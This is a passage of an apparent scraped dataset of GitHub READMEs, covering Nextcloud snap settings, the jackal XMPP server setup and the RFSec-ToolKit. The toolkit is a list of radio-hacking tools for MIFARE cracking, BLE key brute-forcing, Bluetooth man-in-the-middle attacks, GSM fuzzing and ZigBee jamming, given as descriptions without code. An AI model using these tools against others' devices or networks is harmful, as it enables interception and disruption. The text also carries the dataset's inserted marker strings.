run:\n$ sudo snap set nextcloud nextcloud.cron-interval=-1\nto reenable it again simply set the nextcloud.cron-interval snap variable to a value that isn't -1\nhttp compression configuration\nby default, the snap does not enable http compression. to enable it, run:\n$ sudo snap set nextcloud http.compression=true\nto disable it, run:\n$ sudo snap set nextcloud http.compression=false\ndebug mode\nby default, the snap installs itself in production mode, which prevents apache and php from providing any detailed version or library information in the http headers and error pages. debug mode can be enabled with:\n$ sudo snap set nextcloud mode=debug\n\"debug\" and \"production\" are the only valid modes.\nincluded cli utilities\nthere are a few cli utilities included:\nnextcloud.occ:\nnextcloud's occ configuration -----> tool !!! . you can always edit the config file directly (/var/snap/nextcloud/current/nextcloud/config/config.php) but the configuration tool provides a cli interface for it. see nextcloud.occ -h for more information. note that it requires sudo.\nnextcloud.mysql-client:\nmysql client preconfigured to communicate with nextcloud mysql server. this may be useful in case you need to migrate nextcloud installations. note that it requires sudo.\nnextcloud.mysqldump:\ndump nextcloud database to stdout. you should probaby redirect its output to a file. note that it requires sudo.\nnextcloud.enable-https:\nenable https via self-signed certificates, let's encrypt, or custom certificates. http will redirect to https. non-custom certificates will automatically be kept up-to-date. see nextcloud.enable-https -h for more information. note that it requires sudo.\nnextcloud.disable-https:\ndisable https (does not remove certificates). note that it requires sudo.\nnextcloud.manual-install:\nmanually install nextcloud instead of visiting it in your browser. this allows you to create the admin user via the cli. note that it requires sudo.\nnextcloud.export:\nexport data suitable for migrating servers. by default this includes the nextcloud database, configuration, and data. see nextcloud.export -h for more information. note that it requires sudo.\nnextcloud.import:\nimport data exported from another nextcloud snap instance (via nextcloud.export). by default this imports the database, config, and data. see nextcloud.import -h for more information. note that it requires sudo.\nwhere is my stuff?\n$snap_data (/var/snap/nextcloud/current/ by default)\nlogs (apache, php, mysql, redis, and nextcloud logs)\nkeys and certificates\nmysql database\nredis database\nnextcloud config\nany nextcloud apps installed by the user\n$snap_common (/var/snap/nextcloud/common/ by default)\nnextcloud data\nhacking\nif you change something in the snap, build it, install it, and you can run a suite of acceptance tests against it. the tests are written in ruby, using capybara and rspec. to run the tests, you first need to install a few dependencies:\n$ sudo apt install gcc g++ make qt5-default libqt5webkit5-dev ruby-dev zlib1g-dev\n$ sudo gem install bundle\n$ cd tests/\n$ bundle install\nadditionally, if you do not have x configured, install the following for a 'fake' x server.\n$ sudo apt install xvfb\nmake sure the snap has a user called \"admin\" with password \"admin\" (used for login tests):\n$ sudo nextcloud.manual-install admin admin\nand finally, run the tests:\n$ cd tests/\n$ rake test", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000101, "year": null}, {"Unnamed: 0": 106, "autor": 106, "date": null, "content": "jackal\nAn XMPP server written in Go.\nAbout\njackal is a free, open-source, high performance XMPP server which aims to be known for its stability, simple configuration and low resource consumption.\nFeatures\njackal supports the following features:\nCustomizable\nEnforced SSL/TLS\nStream compression (zlib)\nDatabase connectivity for storing offline messages and user settings (PostgreSQL 9.5+)\nClustering capabilities (etcd 3.4+)\nExpose prometheus metrics\nCross-platform (OS X, Linux)\nInstalling\nGetting Started\nTo start using jackal, install Go 1.17+ and run the following commands:\n$ go get -d github.com/ortuman/jackal\n$ cd $GOPATH/src/github.com/ortuman/jackal\n$ make install installctl\nThis will fetch the code and install jackal and jackalctl binaries into your $GOPATH/bin path.\nBy default the application will try to locate service configuration at config.yaml, but alternatively you can specify a custom configuration path either through command line.\n$ jackal --config=/your-custom-path/your-config.yaml\nor environment variable:\n$ env JACKAL_CONFIG_FILE=/your-custom-path/your-config.yaml jackal\nPostgreSQL database creation\nCreate a user and a database for that user:\nCREATE ROLE jackal WITH LOGIN PASSWORD 'password';\nCREATE DATABASE jackal;\nGRANT ALL PRIVILEGES ON DATABASE jackal TO jackal;\nDownload lastest version of the PostgreSQL schema from jackal Github repository.\nwget https://raw.githubusercontent.com/ortuman/jackal/master/sql/postgres.up.psql\nRun the postgres script file to create database schema:\npsql --user jackal --password -f sql/postgres.up.psql\nConfigure jackal to use PostgreSQL by editing the configuration file:\nstorage:\ntype: pgsql\npgsql:\nhost: 127.0.0.1:5432\nuser: jackal\npassword: password\ndatabase: jackal\nThat's it!\nYour database is now ready to connect with jackal.\nCreating jackal user\nAfter completing database setup and starting jackal service you'll have to register a new user to be able to login. To do so, you can use jackal command-line tool to create a new user proving name and password.\nmake installctl && jackalctl user add <user>:<password>\nClustering\nThe purpose of clustering is to be able to use several servers for fault-tolerance and scalability.\nSince jackal is a distributed system, it needs a distributed data store like etcd to share its state across the entire cluster.\nTo properly run jackal in clustering mode make sure to add a cluster section configuration in each of your service nodes.\nHere's an example of how this section should look like:\ncluster:\netcd:\nendpoints:\n- http://<etcd-host1>:<etcd-port1>\n- http://<etcd-host2>:<etcd-port2>\n...\nport: your-cluster-node-port # default is 14369\nNote the defined port value will be used to perform cluster node communication, so make sure is reachable within your internal network.\nServer extensibility\nThe purpose of the extensibility framework is to provide an interface between jackal server and third-party external modules, thus offering the possibility of extending the functionality of the service for particular use cases. Extensibility gRPC API proto files can be found at jackal proto definitions repository.\nAuthenticators\nComponents\nRun jackal in Docker\nThe Docker deployment framework supports easy installation and configuration of jackal server.\nYou need to have Docker installed on your system before you can use a jackal Docker image. See Install Docker for instructions.\nDownload the jackal Docker image from the official Docker Hub library with this command:\ndocker pull ortuman/jackal:latest\nStart a new jackal Docker container with custom configuration.\ndocker run --name=jackal \\\n--mount type=bind,src=/path-on-host-machine/my-custom-config.yaml,dst=/jackal/config.yaml \\\n-d ortuman/jackal:latest\nDocker compose\nAlternatively, and with the purpose of facilitating service mounting, you can make use of docker-compose as follows:\ndocker-compose -f dockerfiles/docker-compose.yml up\nThis command will spin up a jackal server along with its dependencies on a docker network and start listening for incoming connections on port 5222.\nOnce up and running, don't forget to register one or more users using jackalctl.\nSupported Specifications\nRFC 6120: XMPP CORE\nRFC 6121: XMPP IM\nXEP-0004: Data Forms 2.9\nXEP-0012: Last Activity 2.0\nXEP-0030: Service Discovery 2.5rc3\nXEP-0049: Private XML Storage 1.2\nXEP-0054: vcard-temp 1.2\nXEP-0092: Software Version 1.1\nXEP-0114: Jabber Component Protocol 1.6\nXEP-0115: Entity Capabilities 1.5.2\nXEP-0138: Stream Compression 2.0\nXEP-0160: Best Practices for Handling Offline Messages 1.0.1\nXEP-0190: Best Practice for Closing Idle Streams 1.1\nXEP-0191: Blocking Command 1.3\nXEP-0198: Stream Management 1.6\nXEP-0199: XMPP Ping 2.0\nXEP-0202: Entity Time 2.0\nXEP-0220: Server Dialback 1.1.1\nXEP-0237: Roster Versioning 1.3\nXEP-0280: Message Carbons 0.13.3\nXEP-0368: SRV records for XMPP over TLS 1.1.0\nJoin and Contribute\nThe jackal developer community is vital to improving jackal future releases.\nContributions of all kinds are welcome: reporting issues, updating documentation, fixing bugs, improving unit tests, sharing ideas, and any other tips that may help the jackal community.\nCode of Conduct\nHelp us keep jackal open and inclusive. Please read and follow our Code of Conduct.\nLicensing\njackal is licensed under the Apache 2 License. See LICENSE for the full license text.\nContact\nIf you have any suggestion or question:\nMiguel \u00c1ngel Ortu\u00f1o, JID: ortuman@jackal.im, email: ortuman@pm.me", "link": "https://github.com/ortuman/jackal", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "jackal\nan xmpp server written in go.\nabout\njackal is a free, open-source, high performance xmpp server which aims to be known for its stability, simple configuration and low resource consumption.\nfeatures\njackal supports the following features:\ncustomizable\nenforced ssl/tls\nstream compression (zlib)\ndatabase connectivity for storing offline messages and user settings (postgresql 9.5+)\nclustering capabilities (etcd 3.4+)\nexpose prometheus metrics\ncross-platform (os x, linux)\ninstalling\ngetting started\nto start using jackal, install go 1.17+ and run the following commands:\n$ go get -d github.com/ortuman/jackal\n$ cd $gopath/src/github.com/ortuman/jackal\n$ make install installctl\nthis will fetch the code and install jackal and jackalctl binaries into your $gopath/bin path.\nby default the application will try to locate service configuration at config.yaml, but alternatively you can specify a custom configuration path either through command line.\n$ jackal --config=/your-custom-path/your-config.yaml\nor environment variable:\n$ env jackal_config_file=/your-custom-path/your-config.yaml jackal\npostgresql database creation\ncreate a user and a database for that user:\ncreate role jackal with login password 'password';\ncreate database jackal;\ngrant all privileges on database jackal to jackal;\ndownload lastest version of the postgresql schema from jackal github repository.\nwget https://raw.githubusercontent.com/ortuman/jackal/master/sql/postgres.up.psql\nrun the postgres script file to create database schema:\npsql --user jackal --password -f sql/postgres.up.psql\nconfigure jackal to use postgresql by editing the configuration file:\nstorage:\ntype: pgsql\npgsql:\nhost: 127.0.0.1:5432\nuser: jackal\npassword: password\ndatabase: jackal\nthat's it!\nyour database is now ready to connect with jackal.\ncreating jackal user\nafter completing database setup and starting jackal service you'll have to register a new user to be able to login. to do so, you can use jackal command-line -----> tool !!!  to create a new user proving name and password.\nmake installctl && jackalctl user add <user>:<password>\nclustering\nthe purpose of clustering is to be able to use several servers for fault-tolerance and scalability.\nsince jackal is a distributed system, it needs a distributed data store like etcd to share its state across the entire cluster.\nto properly run jackal in clustering mode make sure to add a cluster section configuration in each of your service nodes.\nhere's an example of how this section should look like:\ncluster:\netcd:\nendpoints:\n- http://<etcd-host1>:<etcd-port1>\n- http://<etcd-host2>:<etcd-port2>\n...\nport: your-cluster-node-port # default is 14369\nnote the defined port value will be used to perform cluster node communication, so make sure is reachable within your internal network.\nserver extensibility\nthe purpose of the extensibility framework is to provide an interface between jackal server and third-party external modules, thus offering the possibility of extending the functionality of the service for particular use cases. extensibility grpc api proto files can be found at jackal proto definitions repository.\nauthenticators\ncomponents\nrun jackal in docker\nthe docker deployment framework supports easy installation and configuration of jackal server.\nyou need to have docker installed on your system before you can use a jackal docker image. see install docker for instructions.\ndownload the jackal docker image from the official docker hub library with this command:\ndocker pull ortuman/jackal:latest\nstart a new jackal docker container with custom configuration.\ndocker run --name=jackal \\\n--mount type=bind,src=/path-on-host-machine/my-custom-config.yaml,dst=/jackal/config.yaml \\\n-d ortuman/jackal:latest\ndocker compose\nalternatively, and with the purpose of facilitating service mounting, you can make use of docker-compose as follows:\ndocker-compose -f dockerfiles/docker-compose.yml up\nthis command will spin up a jackal server along with its dependencies on a docker network and start listening for incoming connections on port 5222.\nonce up and running, don't forget to register one or more users using jackalctl.\nsupported specifications\nrfc 6120: xmpp core\nrfc 6121: xmpp im\nxep-0004: data forms 2.9\nxep-0012: last activity 2.0\nxep-0030: service discovery 2.5rc3\nxep-0049: private xml storage 1.2\nxep-0054: vcard-temp 1.2\nxep-0092: software version 1.1\nxep-0114: jabber component protocol 1.6\nxep-0115: entity capabilities 1.5.2\nxep-0138: stream compression 2.0\nxep-0160: best practices for handling offline messages 1.0.1\nxep-0190: best practice for closing idle streams 1.1\nxep-0191: blocking command 1.3\nxep-0198: stream management 1.6\nxep-0199: xmpp ping 2.0\nxep-0202: entity time 2.0\nxep-0220: server dialback 1.1.1\nxep-0237: roster versioning 1.3\nxep-0280: message carbons 0.13.3\nxep-0368: srv records for xmpp over tls 1.1.0\njoin and contribute\nthe jackal developer community is vital to improving jackal future releases.\ncontributions of all kinds are welcome: reporting issues, updating documentation, fixing bugs, improving unit tests, sharing ideas, and any other tips that may help the jackal community.\ncode of conduct\nhelp us keep jackal open and inclusive. please read and follow our code of conduct.\nlicensing\njackal is licensed under the apache 2 license. see license for the full license text.\ncontact\nif you have any suggestion or question:\nmiguel \u00e1ngel ortu\u00f1o, jid: ortuman@jackal.im, email: ortuman@pm.me", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000106, "year": null}, {"Unnamed: 0": 108, "autor": 108, "date": null, "content": "RFSec-ToolKit V 2.0\nProject Description\nRFSec-ToolKit is a collection of Radio Frequency Communication Protocol Hacktools which are from the github platform,and Hacking Tutorial from youtube\u3001blog post, including SDR\u30012G GSM\u30013G \u30014G LTE \u30015G\u3001NFC&RFID\u3001ZigBee and so on.\nWikipedia:List of software-defined radios\n\u66f4\u65b0\u662f\u4e0d\u53ef\u80fd\u66f4\u65b0\u7684\uff0c\u8fd9\u8f88\u5b50\u90fd\u4e0d\u53ef\u80fd\u66f4\u65b0\uff0c\u786c\u4ef6\u53c8\u4e70\u4e0d\u8d77\uff0c\u53ea\u80fd\u901b\u901bgithub\u624d\u80fd\u7ef4\u6301\u751f\u6d3b\u8fd9\u6837\u5b50\uff1b\n\u6bd5\u4e1a\u662f\u4e0d\u53ef\u80fd\u6bd5\u4e1a\u7684\uff0c\u8fd9\u8f88\u5b50\u90fd\u4e0d\u53ef\u80fd\u6bd5\u4e1a\u7684\u3002\u8bba\u6587\u53c8\u4e0d\u4f1a\u5199\uff0c\u5c31\u662f\u5b66\u4e60\u8fd9\u79cd\u4e1c\u897f\uff0c\u624d\u80fd\u7ef4\u6301\u5f97\u4e86\u751f\u6d3b\u7684\u6837\u5b50;\nWhat can we do with Software Defined Radio?\nSome Cool things to do with SDR\nResources Collection by [\u96ea\u78a7 0xroot.com] (https://cn0xroot.com) Twitter@cn0xroot\nSDR Resources\nSDR-HardWare\nRTL2832U:RTL-SDR is a very cheap software defined radio that uses a DVB-T TV tuner dongle based on the RTL2832U chipset.\nHackRF:low cost software radio platform greatscottgadgets.com\nBladeRF:bladeRF is a Software Defined Radio (SDR) platform designed to enable a community of hobbyists, and professionals to explore and experiment with the multidisciplinary facets of RF communication. Nuand.com\nUSRP: The USRP software defined radio products are designed for RF applications from DC to 6 GHz, including multiple antenna (MIMO) systems. ettus.com\nLimeSDR:LimeSDR is a low cost, open source, apps-enabled software defined radio (SDR) platform that can be used to support just about any type of wireless communication standard.Lime Microsystems\nSDR-SoftWare\nGQRX:Software defined radio receiver powered by GNU Radio and Qt\nSDRSharp:Airspy is a popular, affordable SDR (software defined radio) based communication receiver with the highest performance and the smallest form factor. It is a serious alternative to both cost sensitive and higher end scanners while featuring the best radio browsing experience of the market thanks to the tight integration with the de facto standard SDR# software.@airspy_com\nSDR_Console:SDR-Radio.com is a Windows console for Software Defined Radio (SDR) receivers and transceivers. Designed for the commercial, government, amateur radio and short-wave listener communities, the software provides a powerful interface for all SDR users. Suport Hardware List\nHDSDR:HDSDR is a freeware Software Defined Radio (SDR) program for Microsoft Windows 2000/XP/Vista/7/8/8.1/10.\nCubicSDR:Cross-Platform Software-Defined Radio Application\nsdrangel:SDR Rx/Tx software for Airspy, BladeRF, HackRF, LimeSDR, RTL-SDR, SDRplay RSP1 and FunCube\nshinysdr:Software-defined radio receiver application built on GNU Radio with a web-based UI and plugins. In development, usable but incomplete. Compatible with RTL-SDR.\nopenwebrx:Open source, multi-user SDR receiver software with a web interface.\nluaradio:A lightweight, embeddable software-defined radio framework built on LuaJIT.\nqspectrumanalyzer:Spectrum analyzer for multiple SDR platforms (PyQtGraph based GUI for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends)\nPandwaRF:PandwaRF: RF analysis tool with a sub-1 GHz wireless transceiver controlled by a smartphone.\nrpitx:RF transmitter for Raspberry Pi. rpitx is a radio transmitter for Raspberry Pi (B, B+, PI2, PI3 and PI zero) that transmits RF directly to GPIO. It can handle frequencies from 5 KHz up to 500 MHz.\npifm:Turning the Raspberry Pi Into an FM Transmitter.\nrpidatv:Digital Television Transmitter on Raspberry Pi.rpidatv is a digital television transmitter for Raspberry Pi (B,B+,PI2,PI3,Pizero) which output directly to GPIO.\nPSDR:PortableSDR - A Stand Alone HF Software Defined Transciever.\ngr-cc11xx:GNU Radio OOT module for communicating with TI CC11xx based devices.\nspektrum:Spektrum is spectrum analyzer software for use with rtl-sdr.\nOpenUSRP:using LimeSDR to simulate USRP B210,OpenUSRP can using LimeSDR to simulate USRP B210 Device\nkalibrate-rtl:GSM frequency scanner and frequency offset calculator use with rtl-sdr devices\nkalibrate-hackrf:kalibrate for hackrf\nkalibrate-bladeRF:kalibrate for bladeRF\nGNURadio:GNU Radio is a Free & Open-Source Toolkit for Software Radio GNURadio.org\nUniversal Radio Hacker: The Universal Radio Hacker is a software for investigating unknown wireless protocols\ngr-recipes:Main GNU Radio recipe repository for use with PyBOMBS\ngr-etcetera:This repository stores additional recipes for GNU Radio.\nRangeNetworks/dev:A collection of tools to make working with the numerous software components as painless as possible.\nOpenBTS:GSM+GPRS Radio Access Network Node\nYateBTS:YateBTS is a software implementation of a GSM/GPRS radio access network based on Yate and is compatible with both GSM/GPRS SS7 MAP and LTE IMS core networks integrated in our YateUCN unified core network server.\nOpenLTE: OpenLTE is an open source implementation of the 3GPP LTE specifications. The focus is on transmission and reception of the downlink.\nOpenBTS-UMTS:3G UMTS Data Radio Access Network Node\nCellular Infrastructure:This is a group of Osmocom programs implementing cellular network infrastructure components for GSM, GPRS, EDGE, UMTS, HSPA, LTE and their associated interfaces and protocol stacks. 360 Unicorn Team's Demo\nOpenBSC:This is a project aiming to create a Free Software, (A)GPL-licensed software implementations for the GSM/3GPP protocol stacks and elements.\nOsmoBTS:OsmoBTS is an Open Source GSM BTS (Base Transceiver Station) with A-bis/IP interface.\nsrsLTE:srsLTE is a free and open-source LTE library for SDR UE and eNodeB developed by SRS\nsrsUE:srsUE is a software radio LTE UE developed by SRS . It is written in C++ and builds upon the srsLTE library\nsrsGUI:srsGUI is a free and open-source graphics library for SDR using Qt and Qwt. The library provides a number of useful plots for graphing real and complex numbers.\nIMDEA-OWL:OWL stands for Online Watcher of LTE. imdeaOWL is a free and open-source LTE control channel decoder developed by IMDEA Networks Institute and based on srsLTE, an LTE library for SDR UE and eNodeB developed by SRS\nOpenAirInterface:The OpenAirInterface Software Alliance is a non-profit consortium to develop ecosystem for open source software/hardware development for the core network and both access network and user equipment (EUTRAN) of 3GPP cellular networks.\nOpenAirInterface5G:Openairinterface 5G Wireless Implementation.\nLTE Base Station Software:LTEENB allows to build a real 4G LTE base station (called an eNodeB) using a standard PC and a low cost software radio frontend. All the physical layer and protocol layer processing is done in real time inside the PC, so no dedicated LTE hardware is necessary. https://www.amarisoft.com/products-lte-ue-ots-sdr-pcie/#software\nOsmocomBB: OsmocomBB is an Free Software / Open Source GSM Baseband software implementation. It intends to completely replace the need for a proprietary GSM baseband software.\ngr-gsm:Gnuradio blocks and tools for receiving GSM transmissions\ngr-lte:The gr-lte project is an Open Source Software Package which aims to provide a GNU Radio LTE Receiver to receive, synchronize and decode LTE signals.\nLTE-Cell-Scanner:OpenCL, SDR, TDD/FDD LTE cell scanner, full stack from A/D samples to SIB ASN1 messages decoded in PDSCH, (optimized for RTL-SDR HACKRF and BladeRF board)\ngps-sdr-sim:GPS-SDR-SIM generates GPS baseband signal data streams, which can be converted to RF using software-defined radio (SDR) platforms, such as bladeRF, HackRF, and USRP.\ngr-fosphor:GNURadio block for spectrum visualization using GPU\ngr-nordic:GNU Radio module and Wireshark dissector for the Nordic Semiconductor nRF24L Enhanced Shockburst protocol.\ngr-lora:GNU Radio OOT module implementing the LoRa PHY\ngr-ieee802-11:IEEE 802.11 a/g/p transceiver for GNU Radio that is fitted for operation with Ettus N210s and B210s.\ngr-keyfob:Transceiver for Hella wireless car key fobs.\ngr-rds:FM RDS/TMC Transceiver\ngr-radar:GNU Radio Radar Toolbox\ngr-air-modes:gr-air-modes implements a software-defined radio receiver for Mode S transponder signals, including ADS-B reports from equipped aircraft.\ngr-ais:Automatic Information System decoder for shipborne position reporting for the Gnuradio project\ngr-dvbt:DVB-T implementation in gnuradio\nspectrum_painter:A tool to converts images to IQ streams that look like this when viewed in a waterfall plot.\ngr-paint:An OFDM Spectrum Painter for GNU Radio Tutorial\ngr-baz:Collection of new blocks for GNU Radio\nEnvironment Build Tools\nHomeBrew:The missing package manager for macOS\nMacPort:The MacPorts Project is an open-source community initiative to design an easy-to-use system for compiling, installing, and upgrading either command-line\nPybom:PyBOMBS (Python Build Overlay Managed Bundle System) is the new GNU Radio install management system for resolving dependencies and pulling in out-of-tree projects.\nRFSignal Reverse Tools\nAudacity:Audacity\u00ae is free, open source, cross-platform audio software for multi-track recording and editing.\nBaudline:Baudline is a time-frequency browser designed for scientific visualization of the spectral domain. Signal analysis is performed by Fourier, correlation, and raster transforms that create colorful spectrograms with vibrant detail.\nInspectrum:inspectrum is a tool for analysing captured signals, primarily from software-defined radio receivers.\nDspectrum:Automated RF/SDR Signal Analysis [Reverse Engineering]\nrtl_433:Application using librtlsdr to decode the temperature from a wireless temperature sensor\nooktools:On-off keying tools for your SD-arrrR leonjza.github.io\nYouTuBe Video Tutorial\nRoberto N\u00f3brega: Michael Ossmann Software Defined Radio with HackRF )https://www.youtube.com/user/liquen17/playlists\nHardware Hacking By Samy Kamkar https://www.youtube.com/user/s4myk\nRadio Hacking: Cars, Hardware, and more! - Samy Kamkar - AppSec California 2016 https://www.youtube.com/watch?v=1RipwqJG50c\nGNURadio: GRCon [https://www.youtube.com/channel/UCceoapZVEDCQ4s8y16M7Fng] (https://www.youtube.com/channel/UCceoapZVEDCQ4s8y16M7Fng)\nBalint256:GNU Radio Tutorial Series\u3001Cyberspectrumhttps://www.youtube.com/user/balint256\nCrazy Danish Hacker: https://www.youtube.com/channel/UClg0eyJTbAZaYuz3mhwfBBQ/playlists\nEttusresearch https://www.youtube.com/user/ettusresearch/feed\nAnders Brownworth Well Tempered HackerOpenBTS https://www.youtube.com/playlist?list=PL892EE6BB9D10192F\nGareth's SDR Tutorial https://www.youtube.com/channel/UCYJO5ecRhbWARNcsDIFffPg\nSoftware Defined Radio Academy https://www.youtube.com/channel/UC1GAlgAQrkjeeLmIkCB8pgQ\n\u96ea\u78a7 0xroot's SDR Hacking https://www.youtube.com/channel/UCVc4stniRjRfOi1eY-0Ij2Q\n26C3: Using OpenBSC for fuzzing of GSM handsets https://www.youtube.com/watch?v=oGPOscdLPFQ\n27c3: SMS-o-Death https://www.youtube.com/watch?v=J-lUL3E-uPc\n27c3: Wideband GSM Sniffing https://www.youtube.com/watch?v=fH_fXSr-FhU&feature=youtu.be 28c3: Introducing Osmo-GMR https://www.youtube.com/watch?v=BSW-V94uZZQ&feature=youtu.be\n29C3: Further hacks on the Calypso platform https://www.youtube.com/watch?v=xFjVcxMpA6c&feature=youtu.be\n[FOSDEM 2014] osmocom: Overview of our SDR projects https://www.youtube.com/watch?v=hsKvdga2eQg&feature=youtu.be\nSylvain Munaut: osmo-gmr: What's up with sat-phones ?https://www.youtube.com/watch?v=ROppOLeB6_I&feature=youtu.be\nDeepSec 2010 OsmocomBB A tool for GSM protocol level security analysis of GSM networkshttps://www.youtube.com/watch?v=9cBJV3yTaQo&feature=youtu.be\nDeepSec 2010: Targeted DOS Attack and various fun with GSM Um by Sylvain Munaut https://www.youtube.com/watch?v=7tc4hD7ckZY&feature=youtu.be\nUnicornTeam of Ir0nSmith http://v.qq.com/vplus/9427cc31bad2413591069f1800862a96\nTwitter&WEB Site\n@rtlsdrblog RTL-SDR.com\nWireless frequency bands: Frequency / Arfcn caculator for LTE, UMTS, GSM and CDMA, and Carrier Aggregation combination info\n@scateu HackRF.NET\n@AndrewMohawk andrewmohawk.com\n@bastibl bastibl.net\n@csete OZ9AEC Website\n@samykamkar Samy Kamkar\n@cn0Xroot cn0xroot.com spriteking.com\n@fairwaves fairwaves\n@gareth__ Gareth codes\n@mpeg4codec ICE9 Blog\n@marcnewlin Marc Newlin\n@drmpegW6RZ\n@CrazyDaneHacker Crazy Danish Hacker\njxjputaoshuJiao Xianjun (BH1RXH)'s tech blog\n@bastillenet Bastille\n@embeddedsec\n@RadioHacking\n@elasticninja\n@devnulling\n@uber_security\n@TresActon\n@Kevin2600\n@BE_Satcom\n@lucasteske\n@giorgiofox\n@xdzou\n@090h\n@rfspace\n@mobios\n@lambdaprog\nRuten.proteus\nNFC&RFID Resources\nHardWare\nProxMark3:The proxmark3 is a powerful general purpose RFID tool, the size of a deck of cards, designed to snoop, listen and emulate everything from Low Frequency (125kHz) to High Frequency (13.56MHz) tags.\nACR122U:\nSoftWare\nmiguelbalboa/rfid:Arduino library for MFRC522 and other RFID RC522 based modules.\nRFIDIOt:python RFID / NFC library & tools\nRFIDler:RFIDler - Software defined RFID (LF) Reader/Writer/Emulator\nlibnfc:Platform independent Near Field Communication (NFC) library\nmfoc:Mifare Classic Offline Cracker\nmfcuk:Mifare Classic Universal toolKit (MFCUK)\nTutorial\ncn0xroot.com\nFreeBuf.com\nBLE Resources\nHardWare\nUbertooth:Ubertooth ships with a capable BLE (Bluetooth Smart) sniffer and can sniff some data from Basic Rate (BR) Bluetooth Classic connections.\nTI CC2540:The CC2540 is a cost-effective, low-power, true system-on-chip (SoC) for Bluetooth low energy applications.\nSoftWare\nTI PACKET-SNIFFER:The SmartRF Packet Sniffer is a PC software application that can display and store radio packets captured by a listening RF device. The capture device is connected to the PC via USB. Various RF protocols are supported. http://www.ti.com/tool/packet-sniffer\nlibbtbb:A Bluetooth baseband decoding library\ncrackle:crackle exploits a flaw in the BLE pairing process that allows an attacker to guess or very quickly brute force the TK (Temporary Key). With the TK and other data collected from the pairing process, the STK (Short Term Key) and later the LTK (Long Term Key) can be collected.\nspectool:Spectools is a set of utilities for using various spectrum analyzer hardware. It supports the suite of Wi-Spy devices (original, 24x, 24x2, DBX, DBX2, 900, 24i) by Metageek LLC and the Ubertooth. Spectools includes userspace drivers for the hardware itself, a graphing UI built GTK and Cairo, network protocols for remote device capture, and simple utilities for developing additional tools.\nspectool-web:A web viewer for WiSPY and Ubertooth spectrum data\ngatttool :Get Started with Bluetooth Low Energy on Linux\nhcitool:hcitool is used to configure Bluetooth connections and send some spe- cial command to Bluetooth devices.\nBLE-Security:Bluetooth door hacking scripts that require Ubertooth or other devices to passively sniff.\nBLESuite: BLESuite is a Python package that provides an easier way to test Bluetooth Low Energy (BLE) device (By NCC Group)\nBLESuite-CLI:BLESuite_CLI is a command line tool to enable an easier way to test Bluetooth Low Energy (BLE) devices\nBLE-Replay:BLE-Replay is a Bluetooth Low Energy (BLE) peripheral assessment tool\nBlue-Hydra Bluetooth device discovery service built on top of the bluez library. BlueHydra makes use of ubertooth where available and attempts to track both classic and low energy (LE) bluetooth devices over time.\nBTLEJuice:BtleJuice is a complete framework to perform Man-in-the-Middle attacks on Bluetooth Smart devices (also known as Bluetooth Low Energy).\nwireshark:Wireshark is the world\u2019s foremost and widely-used network protocol analyzer.\nTutorial\nBLE Hacking\uff1able scan and sniffer withu bertooth-one\nUbertooth \u2013 Bluetooth Sniffing Updated for 2014\nSpectrum Tools and Ubertooth One\nBLE Fun With Ubertooth: Sniffing Bluetooth Smart and Cracking Its Crypto\nUbertooth Spectrum Analysis (Kali/Chromebook)\nSniffing/logging your own Android Bluetooth traffic\nInstalling the Ubertooth One on BT5\nZigBee Resources\nSoftWare\ngr-ieee802-15-4:IEEE 802.15.4 ZigBee Transceiver\nSecBee:SecBee is a ZigBee security testing tool developed by Cognosec. The goal is to enable developers and security testers to test ZigBee implementations for security issues.\nZigator Security analysis tool for Zigbee networks\nLow-Cost ZigBee Selective Jamming\n#Thanks\nAxilirator\n@vileer_com", "link": "https://github.com/cn0xroot/RFSec-ToolKit", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "rfsec-toolkit v 2.0\nproject description\nrfsec-toolkit is a collection of radio frequency communication protocol hacktools which are from the github platform,and hacking tutorial from youtube\u3001blog post, including sdr\u30012g gsm\u30013g \u30014g lte \u30015g\u3001nfc&rfid\u3001zigbee and so on.\nwikipedia:list of software-defined radios\n\u66f4\u65b0\u662f\u4e0d\u53ef\u80fd\u66f4\u65b0\u7684\uff0c\u8fd9\u8f88\u5b50\u90fd\u4e0d\u53ef\u80fd\u66f4\u65b0\uff0c\u786c\u4ef6\u53c8\u4e70\u4e0d\u8d77\uff0c\u53ea\u80fd\u901b\u901bgithub\u624d\u80fd\u7ef4\u6301\u751f\u6d3b\u8fd9\u6837\u5b50\uff1b\n\u6bd5\u4e1a\u662f\u4e0d\u53ef\u80fd\u6bd5\u4e1a\u7684\uff0c\u8fd9\u8f88\u5b50\u90fd\u4e0d\u53ef\u80fd\u6bd5\u4e1a\u7684\u3002\u8bba\u6587\u53c8\u4e0d\u4f1a\u5199\uff0c\u5c31\u662f\u5b66\u4e60\u8fd9\u79cd\u4e1c\u897f\uff0c\u624d\u80fd\u7ef4\u6301\u5f97\u4e86\u751f\u6d3b\u7684\u6837\u5b50;\nwhat can we do with software defined radio?\nsome cool things to do with sdr\nresources collection by [\u96ea\u78a7 0xroot.com] (https://cn0xroot.com) twitter@cn0xroot\nsdr resources\nsdr-hardware\nrtl2832u:rtl-sdr is a very cheap software defined radio that uses a dvb-t tv tuner dongle based on the rtl2832u chipset.\nhackrf:low cost software radio platform greatscottgadgets.com\nbladerf:bladerf is a software defined radio (sdr) platform designed to enable a community of hobbyists, and professionals to explore and experiment with the multidisciplinary facets of rf communication. nuand.com\nusrp: the usrp software defined radio products are designed for rf applications from dc to 6 ghz, including multiple antenna (mimo) systems. ettus.com\nlimesdr:limesdr is a low cost, open source, apps-enabled software defined radio (sdr) platform that can be used to support just about any type of wireless communication standard.lime microsystems\nsdr-software\ngqrx:software defined radio receiver powered by gnu radio and qt\nsdrsharp:airspy is a popular, affordable sdr (software defined radio) based communication receiver with the highest performance and the smallest form factor. it is a serious alternative to both cost sensitive and higher end scanners while featuring the best radio browsing experience of the market thanks to the tight integration with the de facto standard sdr# software.@airspy_com\nsdr_console:sdr-radio.com is a windows console for software defined radio (sdr) receivers and transceivers. designed for the commercial, government, amateur radio and short-wave listener communities, the software provides a powerful interface for all sdr users. suport hardware list\nhdsdr:hdsdr is a freeware software defined radio (sdr) program for microsoft windows 2000/xp/vista/7/8/8.1/10.\ncubicsdr:cross-platform software-defined radio application\nsdrangel:sdr rx/tx software for airspy, 